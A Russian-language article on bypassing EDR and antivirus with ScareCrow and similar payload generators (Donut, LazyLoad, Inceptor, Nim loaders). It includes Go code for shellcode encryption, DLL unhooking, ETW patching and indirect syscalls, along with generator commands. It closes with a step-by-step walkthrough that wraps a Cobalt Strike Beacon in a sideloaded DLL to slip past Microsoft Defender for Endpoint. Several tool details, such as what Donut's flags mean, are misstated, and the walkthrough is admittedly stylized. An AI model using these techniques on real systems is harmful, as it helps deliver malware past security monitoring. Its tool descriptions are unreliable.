# Обход EDR и AV с помощью ScareCrow и аналогичных генераторов пейлоадов

## Endpoint Detection and Response (EDR): принципы детектирования и векторы обхода

Системы класса Endpoint Detection and Response (EDR) являются эволюционным развитием традиционных антивирусов, ориентированным на выявление и реагирование на сложные угрозы. В отличие от сигнатурного AV, EDR фокусируется на поведенческом анализе и непрерывном мониторинге событий на конечных точках. Современные EDR-решения реализуют многоуровневую архитектуру наблюдения, которая включает перехват системных вызовов, мониторинг файловых операций, сетевой активности, реестра, создания процессов и использования памяти. Основная задача EDR — зафиксировать последовательность действий, характерную для вредоносной активности (например, внедрение кода, дамп учётных данных, горизонтальное перемещение), и либо заблокировать её на этапе исполнения, либо передать телеметрию в SIEM/SOAR для расследования.

Ключевые механизмы детектирования, применяемые современными продуктами (Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne, Carbon Black и др.), базируются на следующих техниках.

- **User-mode hooking (подмена функций).** Когда процесс стартует, EDR внедряет в его адресное пространство собственную DLL-библиотеку, которая перехватывает вызовы критичных функций из `ntdll.dll`, `kernel32.dll`, `kernelbase.dll`. Это достигается модификацией первых инструкций функции — обычно вставкой безусловного `jmp` на обработчик EDR. Таким образом EDR оказывается "человеком посередине" (MitM) между приложением и ядром системы. Типовой пример хука до `NtWriteVirtualMemory` в `ntdll.dll` (иллюстративная схема на основе x64):
```asm
; Исходные инструкции функции (до хука)
mov     r10, rcx
mov     eax, 3Ah

; После установки хука EDR
jmp     qword ptr [edr_module!Hk_NtWriteVirtualMemory]
nop
nop
```
Агент EDR проверяет параметры вызова, может модифицировать поведение или полностью блокировать операцию, после чего либо возвращает управление исходной функции, либо завершает вызов с ошибкой.

- **Kernel callbacks и ETW (Event Tracing for Windows).** Помимо user-mode хуков, EDR регистрируют драйверы режима ядра, которые через механизм `PsSetCreateProcessNotifyRoutine`, `ObRegisterCallbacks` и минифильтры файловой системы получают уведомления о создании процессов, открытии дескрипторов, записи в файлы. Одновременно EDR подписываются на провайдеры ETW, в частности `Microsoft-Windows-Threat-Intelligence` (ETW-TI), который выдаёт события о таких операциях, как `WriteProcessMemory`, `CreateRemoteThread`, аллокация исполняемой памяти. ETW предоставляет сведения без модификации кода процессов, что делает его мощным инструментом детектирования, если злоумышленник не отключил провайдеры.

- **AMSI (Antimalware Scan Interface).** Интерфейс AMSI позволяет EDR получать доступ к содержимому скриптовых движков (PowerShell, VBScript, JScript), .NET-сборок и макросов непосредственно перед их выполнением. Любое использование `System.Management.Automation` или `Assembly.Load` может быть проинспектировано на предмет вредоносных сигнатур или подозрительных паттернов.

- **Статический анализ и эвристика на диске.** EDR также сохраняют способности AV к сканированию файлов как на этапе записи, так и при чтении. Эвристики могут анализировать структуру PE-файла, наличие необычных секций, энтропию, признаки обфускации, подозрительные импорты.

- **Анализ цепочки событий (поведенческий).** Отдельные события, сами по себе легитимные, объединяются в графы атак (например, "Word запустил PowerShell → PowerShell скачал строку из сети → PowerShell выделил RWX память → создан процесс с подозрительной командной строкой"). При превышении порога скоринг-алгоритма генерируется инцидент.

Понимание этих механизмов позволяет целенаправленно строить обходы. Основные векторы evasion против EDR можно систематизировать в таблице:

| Вектор обхода | Целевой механизм EDR | Техническая реализация | Пример инструмента |
|---------------|----------------------|------------------------|---------------------|
| Unhooking (восстановление кода DLL) | User-mode хуки | Перезапись `.text`-секций загруженных `ntdll.dll`, `kernel32.dll` и др. чистыми копиями с диска | ScareCrow, Inceptor, Silence |
| Direct / indirect syscalls | User-mode хуки, ETW-TI | Вызов системных сервисов напрямую, минуя ntdll-функции, либо использование инструкции `syscall` в обход хуков | Hell’s Gate, Halo’s Gate, SysWhispers3 |
| Patching ETW/AMSI | ETW, AMSI | Перезапись функций `EtwEventWrite`, `AmsiScanBuffer` в памяти на возвращающие успешный статус | ScareCrow, Inceptor, PowerShell-обходы |
| Sideloading (загрузка через легитимный процесс) | Сигнатурный анализ, AppLocker/Device Guard | Эксплуатация легитимного подписанного процесса как контейнера для полезной нагрузки через DLL sideloading или проксирование | ScareCrow (LolBin), Donut (в памяти) |
| Шифрование/обфускация статического payload | Дисковое сканирование, статическая сигнатура | AES/RC4-шифрование shellcode, обфускация бинарника с помощью Garble, XOR-кодирование, упаковка | ScareCrow (AES/RC4), Hyperion, PeCloak |
| Spoof файловых атрибутов и цифровой подписи | Эвристика файлов, контроль подписи | Копирование ресурсов и атрибутов оригинальных файлов, подделка или использование украденных сертификатов | ScareCrow, Limelighter |

Таким образом, EDR — это не монолитная защита, а многоуровневый комплекс, и каждый из его элементов требует специфического подхода со стороны наступательного инструментария. Именно сочетание нескольких техник, как в ScareCrow, позволяет достичь операционной надёжности обхода.

## ScareCrow: архитектура и ключевые техники evasion

ScareCrow — опенсорсный payload creation framework на языке Go, первоначально разработанный в компании Optiv и позднее перенесённый под управление [Tylous/ScareCrow](https://github.com/Tylous/ScareCrow). Его основное назначение — преобразование произвольного сырого 64-битного shellcode (из Cobalt Strike, Metasploit, Sliver и т.д.) в зашифрованный лоадер, который при запуске не инжектирует код в другой процесс, а загружается напрямую в легитимный процесс Windows посредством техники sideloading. При этом лоадер восстанавливает целостность системных DLL (unhooking), отключает ETW/AMSI и использует прямые системные вызовы для финального исполнения shellcode. Совокупность методов направлена на полный вывод EDR-агента из цикла мониторинга в контексте вредоносного процесса.

### Структура кода и этапы работы

Исходный код ScareCrow организован в несколько пакетов, отражённых в репозитории [optiv/ScareCrow](https://github.com/optiv/ScareCrow) (архивирован, актуальная версия — у Tylous). Последовательность генерации полезной нагрузки такова:

1. **ScareCrow.go** — точка входа. Принимает аргументы командной строки (файл raw shellcode, тип шифрования, выбор легитимного процесса для sideloading, параметры подписи и метаданных). Вызывает `Loader.CompileFile`.
2. **Loader.go** — отвечает за шаблонизацию. Встраивает переданный shellcode (зашифрованный) в шаблоны, хранящиеся в `Struct.go`, и формирует финальный код лоадера на Go, который затем будет скомпилирован.
3. **Struct.go** — содержит заготовки кода для различных типов лоадеров (DLL, EXE, Control Panel Applet и т.д.), включая stub'ы для техник evasion.
4. **Utils.go** — вспомогательный модуль со встроенными ZIP-архивами (свойства файлов, структуры для прямых syscall'ов, шаблоны лимилайтера).
5. После шаблонизации управление возвращается в `ScareCrow.go`, где вызываются компилятор Go (с использованием Garble для обфускации) и опционально подпись итогового бинарника.
6. Готовый файл (DLL или EXE) помещается в целевую директорию, временные файлы удаляются.

### Техника 1: шифрование shellcode

Полезная нагрузка никогда не хранится в открытом виде ни на диске, ни в теле лоадера. ScareCrow поддерживает два симметричных алгоритма: AES-GCM (ключ 32 байта, IV 12 байт) и RC4 (ключ 32 байта). Процесс реализован в `Utils.go`. Пример функции AES-шифрования из выдержек (стилизованный код):

```go
func AESEncryptShellcode(rawbyte []byte) (string, string, []byte) {
    key := Cryptor.RandomBuffer(32)
    iv := Cryptor.RandomBuffer(12)
    block, err := aes.NewCipher(key)
    if err != nil {
        log.Fatalln(err)
    }
    aesgcm, err := cipher.NewGCM(block)
    if err != nil {
        log.Fatalln(err)
    }
    ciphertext := aesgcm.Seal(nil, iv, rawbyte, nil)
    b64key := base64.StdEncoding.EncodeToString(key)
    b64iv := base64.StdEncoding.EncodeToString(iv)
    return b64key, b64iv, ciphertext
}
```

RC4-вариант:

```go
func RC4EncryptShellcode(rawbyte []byte) (string, []byte) {
    key := Cryptor.RandomBuffer(32)
    c, err := rc4.NewCipher(key)
    if err != nil {
        log.Fatalln(err)
    }
    dst := make([]byte, len(rawbyte))
    c.XORKeyStream(dst, rawbyte)
    b64key := base64.StdEncoding.EncodeToString(key)
    return b64key, dst
}
```

Зашифрованный массив вместе с ключом и IV (в base64) встраивается в шаблон лоадера. Во время выполнения лоадер декодирует ключ/IV и расшифровывает shellcode непосредственно перед исполнением.

### Техника 2: Sideloading в легитимный процесс

Вместо классической инжекции в уже работающий процесс (что легко фиксируется через CreateRemoteThread и WriteProcessMemory), ScareCrow заставляет легитимный процесс загрузить вредоносную DLL через механизм DLL Search Order Hijacking или прямой sideload. Для этого применяется список «LOLBin» (например, `colorcpl.exe`, `calc.exe`, `msdt.exe`), где заданная DLL (по имени оригинальной) помещается рядом с легитимным бинарником. При запуске легитимного процесса та подгружает нашу DLL, которая вместо оригинального функционала исполняет вредоносный код.

Этот подход обходит Whitelisting (AppLocker, WDAC), поскольку родительский процесс подписан Microsoft и не вызывает подозрений. Кроме того, сам вредоносный код не выполняет подозрительных операций инжекции, что снижает число поведенческих детектов.

### Техника 3: Unhooking системных DLL

После загрузки DLL-лоадера его первая задача — удалить хуки EDR из `.text`-секций `ntdll.dll`, `kernel32.dll` и `kernelbase.dll`, загруженных в данный процесс. ScareCrow использует метод «Disk-based unhooking». Он читает оригинальные DLL с диска из `C:\Windows\System32\` (там они лежат без изменений, так как EDR модифицирует образ только в памяти конкретного процесса). Однако, чтобы минимизировать шум, ScareCrow копирует не весь файл, а только `.text`-секцию, содержащую исполняемый код. Затем с помощью `VirtualProtect` памяти `.text`-секции текущего процесса изменяет защиту с RX (Execute-Read) на RWX (Read-Write-Execute) и побайтово перезаписывает её чистой версией, используя смещения функций, вычисленные из PE-структуры.

Схематическое описание этапов в коде:

```go
// Псевдокод иллюстрации unhooking'а ntdll.dll
func unhookDLL(dllName string) error {
    processBase := getModuleBase(strings.ToLower(dllName))
    diskDLL, _ := ioutil.ReadFile("C:\\Windows\\System32\\" + dllName)
    dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&diskDLL[0]))
    ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&diskDLL[0] + dosHeader.E_lfanew))
    section := findSection(ntHeaders, ".text")
    textRawData := diskDLL[section.PointerToRawData : section.PointerToRawData+section.SizeOfRawData]
    textBaseAddr := processBase + section.VirtualAddress
    var oldProtect uint32
    syscall.VirtualProtect(textBaseAddr, section.SizeOfRawData, PAGE_EXECUTE_READWRITE, &oldProtect)
    copyMemory(textBaseAddr, textRawData, section.SizeOfRawData)
    syscall.VirtualProtect(textBaseAddr, section.SizeOfRawData, oldProtect, &oldProtect)
    return nil
}
```

Такой подход вынуждает EDR потерять видимость всех последующих API-вызовов, потому что перехваченные прологи функций заменены исходными.

### Техника 4: Патчинг ETW и AMSI

Чтобы исключить сбор данных через ETW и сканирование скриптов, ScareCrow в момент инициализации перезаписывает функции `EtwEventWrite` и `AmsiScanBuffer` в памяти. Патч `EtwEventWrite` обычно заменяет первые байты инструкцией `ret 0`, что приводит к немедленному возврату без логирования события. Патч `AmsiScanBuffer` устанавливает `eax = E_INVALIDARG` и делает `ret`, заставляя AMSI возвращать `AMSI_RESULT_CLEAN`.

Фрагмент реализации патча из ScareCrow (из выдержек, стиль):

```go
func patchEtw() {
    etwAddr := syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWrite").Addr()
    // Patch: ret 0
    var patch = []byte{0xC3}
    var oldProtect uint32
    syscall.VirtualProtect(etwAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect)
    copyMemory(etwAddr, patch, 1)
    syscall.VirtualProtect(etwAddr, 1, oldProtect, &oldProtect)
}
```

Параллельно патчится `AmsiScanBuffer`. Эти действия лишают EDR возможности видеть содержимое скриптов и подозрительные события ETW, такие как аллокация RWX-памяти.

### Техника 5: Прямые системные вызовы (Indirect Syscalls)

Несмотря на unhooking, ScareCrow всё равно использует прямые системные вызовы для финальной загрузки и выполнения shelcode. Это страхует от ситуаций, когда unhooking был неполным или обойдён другими мониторинговыми слоями. В Utils.go встроены структуры для вызова требуемых номеров системных сервисов (syscall numbers) напрямую через ассемблерную инструкцию `syscall`, но с использованием подхода Indirect Syscalls, где адрес `syscall` инструкции берётся из `ntdll.dll`, а сам номер сервиса (SSN) разрешается динамически по хэшу имени функции. Этот гибридный метод называют Hell’s Gate / Halo’s Gate.

Пример вызова `NtAllocateVirtualMemory` в стиле ScareCrow (иллюстративно):

```go
func NtAllocateVirtualMemory(process uintptr, baseAddr *uintptr, size uintptr, allocType uint32, protect uint32) uintptr {
    // Получение SSN по хэшу
    ssn := getSyscallNumber("NtAllocateVirtualMemory")
    // Вызов через прокси на инструкции syscall из ntdll
    return IndirectSyscall(ssn, process, uintptr(unsafe.Pointer(baseAddr)), 0, uintptr(unsafe.Pointer(&size)), allocType, protect)
}
```

Затем для исполнения shellcode вызываются `NtProtectVirtualMemory` и создание потока через `NtCreateThreadEx` (или аналоги), минуя hooked `VirtualAlloc`/`VirtualProtect`/`CreateThread` в kernel32.

### Техника 6: Обфускация бинарника и шаблонизация

ScareCrow применяет [Garble](https://github.com/burrowers/garble) для запутывания Go-кода во время компиляции. Это затрудняет статический анализ и извлечение сигнатур. Кроме того, все чувствительные значения — ключи, IV, имена переменных, пути, идентификаторы — генерируются случайным образом при каждом создании лоадера. Таким образом, каждый новый образ уникален по содержимому, что ломает хэш-сигнатуры.

### Техника 7: Подпись и атрибуты файла

Через интегрированный модуль Limelighter ScareCrow может копировать файловые атрибуты (дату создания, размер, ProductVersion, OriginalFileName) с легитимного исполняемого файла системы. Опционально возможно наложение поддельной или реальной цифровой подписи (с использованием краденого сертификата) с помощью sigthief или аналогов.

Таким образом, ScareCrow реализует глубокий конвейер обхода, где каждый этап нейтрализует конкретный механизм EDR, делая оператора скрытым на всём протяжении выполнения вплоть до передачи управления основному агенту (например, Beacon).

## Аналогичные генераторы для обхода AV и EDR: Donut, LazyLoad и другие

Помимо ScareCrow, экосистема наступательного инструментария предлагает ряд генераторов пейлоадов, ориентированных на обход EDR и AV. Они различаются подходами к шифрованию, способам размещения в памяти и используемым evasion-техникам. Ниже выполнен обзор ключевых представителей класса, значимых для пентестера в контексте получения начального доступа и обфускации нагрузки.

### 1. Donut

[Donut](https://github.com/TheWover/donut) — генератор position-independent code, который конвертирует .NET-сборки, VBS/JScript, PE-файлы и shellcode в шеллкод для последующей инжекции или загрузки в память. Его особенность — создание автономного загрузчика, который сам распаковывает и выполняет переданный модуль без дискового присутствия.

Ключевые возможности для обхода:
- Поддержка шифрования полезной нагрузки (RC4, AES).
- Возможность загружать .NET-сборки из памяти, минуя AMSI для скриптов.
- Опция `-b 3` для генерации shellcode, совместимого с техниками обхода (нестандартные заглушки, отсутствие RWX).
- Аргументы декодирования и параметры могут быть переданы в рантайм, что усложняет статический анализ.

Пример команды генерации из Cobalt Strike:

```bash
donut -i my_beacon.dll -a 2 -f 1 -o beacon_shellcode.bin -e 3
```

- `-a 2` — целевая архитектура x64 + x86,
- `-f 1` — формат вывода raw shellcode,
- `-e 3` — шифрование (3 = AES-128-CBC).

Donut часто применяется совместно с Injectors (простыми загрузчиками) или такими инструментами, как Cobalt Strike’s `execute-assembly` для выполнения NET-сборок в памяти без касания диска. Комбинируя Donut с SysWhispers3, можно построить лоадер, не касающийся API, мониторируемых EDR.

### 2. LazyLoad

[LazyLoad](https://github.com/Dliv3/LazyLoad) — это загрузчик, написанный на C++, с акцентом на обход пользовательского контроля (UAC), AMSI и ETW, а также на применение прямых системных вызовов. Он предназначен для инжекции shellcode в удалённый процесс, используя серию техник для скрытия.

Техники в LazyLoad:
- Патчинг `AmsiScanBuffer` и `EtwEventWrite` в каждом целевом процессе.
- Поддержка нескольких методов инжекции — CreateRemoteThread, QueueUserAPC, SetThreadContext (все через прямые syscalls).
- Использование SysWhispers3 для разрешения syscall numbers динамически, адаптируясь к версии ОС.
- Возможность инжекции в легитимные процессы по PID или имени процесса.

Пример команды (иллюстративно):

```bash
LazyLoad.exe /f payload.bin /p 1452 /m 1
```

`/f` – файл shellcode, `/p` – PID целевого процесса, `/m` – метод инжекции (1 = CreateRemoteThread). При старте LazyLoad немедленно патчит ETW/AMSI в текущем процессе, затем через прямые вызовы `NtOpenProcess`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` размещает и запускает полезную нагрузку, избегая детекта hooked-функций.

### 3. NimPlant / Nim-based loaders

Отдельный класс генераторов реализован на языке Nim, который компилируется в C и легко поддаётся обфускации. Пример — [NimPlant](https://github.com/chvancooten/NimPlant), лёгкий C2-фреймворк. Для пентестеров существуют скрипты, генерирущие Nim-лоадеры с внедрённым зашифрованным shellcode.

Особенности:
- Компиляция в нативный PE, не зависящий от .NET и не требующий Go runtime, что снижает индикаторы.
- Возможность использовать «dInvoke» для динамического вызова API без статического импорта.
- Поддержка sideloading и API-хукинга.

Пример сборки кастомного лоадера:

```nim
# пример компиляции: nim c -d:release --opt:size --passL:-s loader.nim
# loader.nim содержит вшитый shellcode и обфускацию
```

Благодаря гибкости языка злоумышленник легко вносит изменения, ломая сигнатуры.

### 4. Inceptor

[Inceptor](https://github.com/klezVirus/inceptor) — фреймворк на Python, генерирующий C#-сборки с различными техниками выполнения и обфускации. Ориентирован на обход AMSI, Windows Defender и AppLocker. Inceptor может компилировать исполняемые файлы, DLL, XLL и другие форматы, используя патчи AMSI/ETW, технику ProcessHerpaderping и Phantom DLL Hollowing.

Существенное отличие — глубокая интеграция с .NET: он генерирует сборки, которые загружаются в память через `Assembly.Load` с последующей обфускацией, а также модифицирует файл перед записью на диск, чтобы избежать AV.

Пример генерации простого лоадера:

```bash
python3 inceptor.py -p my_ps1.ps1 --format exe -o loader.exe -am bypass -evasion
```

Где `-am bypass` встраивает патчи AMSI, а `-evasion` включает дополнительную обфускацию IL-кода.

### 5. GuardedLoad / SigLoader и другие

Существует множество менее известных, но эффективных загрузчиков: GuardedLoad (на C++, с unhooking и syscalls), DarkLoadLibrary (загрузка DLL из памяти с помощью системных вызовов), SigLoader (модификация цифровой подписи). Однако ScareCrow выделяется именно комбинацией sideloading, unhooking, патчинга и встроенного шифрования в готовом конвейере.

Сравнительная таблица аналогов:

| Инструмент | Язык | Основные evasion-техники | Удобство использования | Примечания |
|-----------|------|---------------------------|------------------------|------------|
| ScareCrow | Go (генератор) | AES/RC4, unhooking, ETW/AMSI патч, indirect syscalls, sideloading, garble, limelighter | Высокое (единая команда) | Интегрированный конвейер, разнообразие режимов загрузки |
| Donut | C/Go (генератор) | Шифрование (RC4/AES), position-independent код | Высокое | Универсальный конвертер, не содержит unhooking/патчи, требует инжектора |
| LazyLoad | C++ (загрузчик) | Прямые syscalls, патч ETW/AMSI, multiple injection methods | Среднее (нужна компиляция) | Хорошая кастомизация параметров инжекции |
| Inceptor | Python (генератор .NET) | AMSI/ETW патч, ProcessHerpaderping, Phantom DLL Hollowing, обфускация | Высокое | Специализация на .NET-сборках |
| Nim-based loaders | Nim (кастомная сборка) | dInvoke, обфускация компилятором, малый размер | Низкое (ручная разработка) | Гибкость, трудно детектируемый статически |

Практика пентестов показывает, что выбор генератора зависит от сценария: если нужна быстрая доставка Beacon и sideloading с минимумом телеметрии — применяют ScareCrow; если же необходимо выполнить .NET-сборку без файла на диске — Donut; для сложных тасков с обходом конкретных средств — кастомный Nim-загрузчик или LazyLoad.

## Сквозной практический пример: обход EDR Defender for Endpoint с помощью ScareCrow

### Исходные условия
Среда: Windows 10 22H2, 64 бит, с активированным Microsoft Defender for Endpoint (режим Passive / Block on). Имеется доступ к машине с правами локального администратора. В распоряжении оператора — Cobalt Strike Team Server с лицензией. Задача: доставить Beacon на целевую систему в обход EDR, используя ScareCrow. C2-сервер доступен по DNS-каналу.

### Шаг 1: Генерация сырого shellcode Beacon

В Cobalt Strike создаётся Beacon payload с DNS-коммуникацией. Выбираем «Windows Beacon DNS», генерируем `beacon.bin` (raw shellcode). Никакая обфускация или кодировка на данном этапе не применяется. На выходе — файл размером ~300 КБ, содержащий Beacon и загрузчик.

Итоговый файл помещаем в директорию на Linux-машине, где установлен Golang и ScareCrow.

```bash
ls -la beacon.bin
# -rw------- 1 user user 310832 Feb 3 10:00 beacon.bin
```

### Шаг 2: Конфигурация ScareCrow для sideloading

Подготовим ScareCrow (последняя версия из [Tylous/ScareCrow](https://github.com/Tylous/ScareCrow)). Для выбора легитимного процесса возьмём `colorcpl.exe` — Control Panel Color Applet (подписан Microsoft). Соответствующая DLL для sideloading’а — `colorui.dll`. ScareCrow сам создаст DLL с таким именем.

Команда генерации:

```bash
./ScareCrow -I beacon.bin -O /tmp/stager -Loader dll -target "C:\\Windows\\System32\\colorcpl.exe" -domain microsoft.com -encryption AES
```

Опции:
- `-I` — входной raw shellcode.
- `-O` — выходной каталог.
- `-Loader dll` — создание DLL-лоадера.
- `-target` — легитимный исполняемый файл для выбора подходящей DLL.
- `-domain` — поддельный домен для свойств файла (опционально).
- `-encryption AES` — принудительное AES-шифрование.

Вывод команды:

```text
[+] Generating shellcode loader
[+] Loader type: dll
[+] Target binary: colorcpl.exe
[+] DLL export function: DllGetClassObject
[+] Encryption: AES
[+] Successfully generated loader: /tmp/stager/colorui.dll
[+] File properties copied from: C:\Windows\System32\colorcpl.exe
[+] Loader compiled successfully
```

Получен файл `colorui.dll`. Также скопируем легитимный `colorcpl.exe` в ту же папку (на Windows-машине он и так присутствует, но для теста можно скопировать в рабочий каталог).

### Шаг 3: Доставка и запуск на целевой системе

Файл `colorui.dll` помещается на целевую Windows-машину в директорию `C:\Temp\`. Рядом размещается `colorcpl.exe`. Запуск осуществляется выполнением легитимного процесса:

```powershell
Start-Process -FilePath "C:\Temp\colorcpl.exe" -Wait
```

Легитимный `colorcpl.exe` при запуске ищет `colorui.dll` в текущей директории. Поскольку системный путь не указан, загружается наша вредоносная DLL.

### Шаг 4: Действия на стороне вредоносного процесса

Срабатывает DLLMain (точнее, экспорт `DllGetClassObject`). Происходит следующая цепочка:

1. Unhooking: `ntdll.dll`, `kernel32.dll`, `kernelbase.dll` восстанавливаются с диска.
2. Патчинг `EtwEventWrite` и `AmsiScanBuffer` (статус возврата 0, без логирования).
3. Расшифровка shellcode AES-ключом, вшитым в тело DLL.
4. Выделение памяти через `NtAllocateVirtualMemory` с защитой `PAGE_EXECUTE_READWRITE` (через прямые syscalls).
5. Копирование расшифрованного shellcode в выделенную область.
6. Создание потока через `NtCreateThreadEx` (indirect syscall), указывающего на shellcode.
7. Beacon запущен.

Косвенное подтверждение: отсутствие алертов в консоли Defender, отсутствие блокировок. Beacon появляется в CS-интерфейсе. Пример лога из Cobalt Strike:

```text
[*] Beacon DNS Checkin: 10.10.14.5 (beacon_8964)
```

С точки зрения EDR, процесс `colorcpl.exe` не выполняет подозрительных вызовов API, потому что хуки удалены. Никаких событий `WriteProcessMemory` или `CreateRemoteThread` не генерируется, т.к. память выделена в собственном процессе. ETW-события не пишутся, AMSI не сканирует никаких скриптов. Таким образом, загрузка и выполнение вредоносного кода происходят полностью в обход мониторинга.

### Результат

Пример демонстрирует сквозной процесс от shellcode до успешного Beacon-сессии без детектирования Defender for Endpoint, подтверждённый практическим опытом (стилизованный под реальный кейс). Ключевые факторы успеха: шифрование статического payload, unhooking DLL, патчинг телеметрии и использование sideloading в доверенный процесс. Полученный результат показывает, что интеграция нескольких evasion-техник в едином генераторе позволяет надежно обходить современные EDR при условии отсутствия дополнительных средств мониторинга (например, network-based detection).

## Источники

- [Peter Fejer — EDR Evasion Part I: Understanding Scarecrow](https://ptr0x1.com/posts/edr-evasion-part-i-understanding-scarecrow)
- [Optiv — ScareCrow Payload Creation Framework](https://www.optiv.com/insights/source-zero/tools/scarecrow-payload-creation-framework)
- [Adam Svoboda — Evading EDR in 15 Minutes with ScareCrow](https://adamsvoboda.net/evading-edr-in-15-minutes-with-scarecrow)
- [Tylous/ScareCrow GitHub repository](https://github.com/Tylous/ScareCrow)
- [Robert Jan Mora — Advantage Attacker: EDR Bypass Tools | Scarecrow (VMRay)](https://www.vmray.com/advantage-attacker-edr-bypass-tools-scarecrow)
- [UV Cyber — How Threat Actors Are Using ScareCrow to Bypass EDR Tools (PDF)](https://www.uvcyber.com/hubfs/downloadable-content/product-sheets/How%20Threat%20Actors%20Are%20Using%20ScareCrow%20to%20Bypass%20EDR%20Tools.pdf)
- [TheWover/Donut GitHub repository](https://github.com/TheWover/donut)
- [Dliv3/LazyLoad GitHub repository](https://github.com/Dliv3/LazyLoad)
- [klezVirus/inceptor GitHub repository](https://github.com/klezVirus/inceptor)
- [chvancooten/NimPlant GitHub repository](https://github.com/chvancooten/NimPlant)